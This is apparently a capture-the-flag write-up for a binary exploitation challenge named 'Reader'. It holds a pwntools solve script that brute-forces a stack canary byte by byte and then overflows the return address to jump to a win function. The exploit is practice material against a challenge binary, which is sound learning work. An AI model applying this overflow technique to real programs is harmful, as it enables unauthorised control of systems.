# Reader

author: awesome10billion

category: pwn

## Solve script
solve.py
```python
from pwn import *
from time import sleep

# Set up the context for the binary
context.binary = './reader'
context.log_level = 'debug'

elf = ELF('./reader')
# Start the process
p = process('./reader')
#p = remote('0.cloud.chals.io',25873)

# Function to brute-force the canary
def brute_force_canary():
    canary = b''
    while len(canary)<8:  # Assuming a 64-bit canary
        for byte in range(256):
            payload = b'A' * 72 + canary + bytes([byte])
            p.send(payload)
            sleep(0.5)
            response = p.recv()
            #print(response)
            if b'stack smashing detected' not in response:
                canary += bytes([byte])
                break
    return canary

# Brute-force the canary
canary = brute_force_canary()
print(f'Brute-forced canary: {canary.hex()}')

p.send(b'A'*72 + canary + b'A'*8 + p64(elf.symbols.win))
p.interactive()
```
